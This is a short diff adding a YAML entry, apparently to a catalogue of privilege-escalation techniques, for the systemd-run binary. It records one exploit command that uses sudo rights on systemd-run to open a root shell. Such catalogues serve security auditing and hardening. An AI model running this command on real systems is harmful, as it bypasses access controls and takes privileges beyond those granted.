@@ -1,0 +1,4 @@
+name: systemd-run
+binary_path: /usr/bin/systemd-run
+exploit_cmds:
+- sudo /usr/bin/systemd-run -t /bin/sh
